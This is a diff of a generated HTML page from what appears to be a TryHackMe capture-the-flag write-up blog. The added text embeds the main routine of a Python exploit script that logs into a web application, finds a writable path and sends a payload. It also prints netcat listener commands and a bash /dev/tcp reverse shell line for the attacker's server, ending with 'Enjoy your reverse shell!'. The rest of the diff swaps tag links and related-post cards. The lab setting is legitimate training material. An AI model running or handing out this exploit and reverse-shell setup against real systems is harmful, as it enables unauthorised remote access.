+    if len(sys.argv) != 7:
+        print(&quot;Usage : &quot;)
+        print(
+            &quot;        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]&quot;
+            % (sys.argv[0])
+        )
+        print(
+            &quot;        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]&quot;
+            % (sys.argv[0])
+        )
+        print(&quot;Example : &quot;)
+        print(
+            &quot;        python %s http://localhost/ admin admin 8.8.8.8 8888 linux&quot;
+            % (sys.argv[0])
+        )
+        print(
+            &quot;        python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows&quot;
+            % (sys.argv[0])
+        )
+        print(&quot;Author : &quot;)
+        print(&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;)
+        exit(1)
+    domain = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    host = sys.argv[4]
+    port = int(sys.argv[5])
+    platform = sys.argv[6]
+    if platform.lower().startswith(&quot;win&quot;):
+        print(&quot;[+] Please execute the following command on your vps: &quot;)
+        print(&quot;nc -lnvp %d&quot; % (port))
+        if not promote_yes(
+            &quot;[+] Please confirm that you have done the two command above [y/n]&quot;
+        ):
+            exit(1)
+    else:
+        print(&quot;[+] Please execute the following command on your vps: &quot;)
+        print(
+            &quot;echo 'bash -c \&quot;bash -i &gt;/dev/tcp/%s/%d 0&gt;&amp;1 2&gt;&amp;1\&quot;' | nc -lnvp %d&quot;
+            % (host, port + 1, port)
+        )
+        print(&quot;nc -lnvp %d&quot; % (port + 1))
+        if not promote_yes(
+            &quot;[+] Please confirm that you have done the two command above [y/n]&quot;
+        ):
+            exit(1)
+    print(&quot;[+] Starting...&quot;)
+    if not login(domain, username, password):
+        print(&quot;[-] Login failed! Please check your username and password.&quot;)
+        exit(2)
+    print(&quot;[+] Login success!&quot;)
+    print(&quot;[+] Getting writeable path...&quot;)
+    path = get_write_able_path(domain)
+    if path == False:
+        print(&quot;[+] Get current path error!&quot;)
+        exit(3)
+    print(&quot;[+] Writeable Path : %s&quot; % (path))
+    print(&quot;[+] Sending payload...&quot;)
+    exploit(domain, username, password, host, port, path, platform)
+    print(&quot;[+] Exploit finished!&quot;)
+    print(&quot;[+] Enjoy your reverse shell!&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
 </section>
 
 
@@ -536,9 +906,9 @@ root
     
     <section class="article-tags">
         
-            <a href="/tags/pcap/">pcap</a>
+            <a href="/tags/brute-forcing/">brute-forcing</a>
         
-            <a href="/tags/crontab/">crontab</a>
+            <a href="/tags/web-work/">web-work</a>
         
             <a href="/tags/sudo/">sudo</a>
         
@@ -559,24 +929,6 @@ root
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-inferno-writeup/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://i.imgur.com/4t9185h.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/4t9185h.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TryHackMe: Inferno Writeup</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
     <a href="/p/tryhackme-agent-sudo-writeup/">
         
         
@@ -589,6 +941,24 @@ root
 
         <div class="article-details">
             <h2 class="article-title">TryHackMe: Agent Sudo Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-year-of-the-rabbit-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/EKb6pFE.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/EKb6pFE.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Year Of The Rabbit Writeup</h2>
         </div>
     </a>
 </article>
@@ -631,18 +1001,18 @@ root
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-dog-cat-vm-writeup/">
+    <a href="/p/tryhackme-lian-yu-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/nSkIlFr.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/nSkIlFr.png"/>
+                    <img src="https://i.imgur.com/SBMvmJZ.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/SBMvmJZ.jpg"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: Dog Cat VM Writeup</h2>
+            <h2 class="article-title">TryHackMe: Lian Yu Writeup</h2>
         </div>
     </a>
 </article>
